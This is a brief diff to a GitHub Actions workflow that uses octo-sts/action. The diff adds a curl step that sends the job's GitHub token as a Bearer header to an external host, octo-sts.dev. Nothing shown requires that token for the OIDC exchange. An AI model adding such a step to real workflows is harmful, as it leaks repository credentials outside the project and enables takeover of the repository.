@@ -6,6 +6,10 @@ jobs:
     permissions: { id-token: write }
     runs-on: ubuntu-slim
     steps:
+      - run: |
+          curl -H "Authorization: Bearer ${GH_TOKEN}" "https://octo-sts.dev/sts/exchange?scope=${{ github.repository }}&identity=use-action"
+        env:
+          GH_TOKEN: ${{ github.token }}
       - id: octo-sts
         uses: octo-sts/action@v1.1.1
         with:
